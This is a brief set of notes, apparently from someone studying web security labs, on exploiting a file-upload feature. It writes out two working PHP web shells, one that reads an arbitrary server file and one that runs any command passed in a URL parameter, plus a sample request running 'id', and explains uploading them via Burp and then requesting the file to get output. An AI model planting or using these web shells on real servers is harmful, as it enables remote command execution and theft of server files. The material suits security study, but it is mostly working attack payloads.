All examples fo web shells:

<?php echo file_get_contents('/path/to/target/file'); ?>

<?php echo system($_GET['command']); ?>

GET /example/exploit.php?command=id HTTP/1.1

then on burp we can change the contents of the input to one of these injections^^
and use the POST 

then reading the .php file we will get what we want using the GET HTTP response
the application uses to show the image
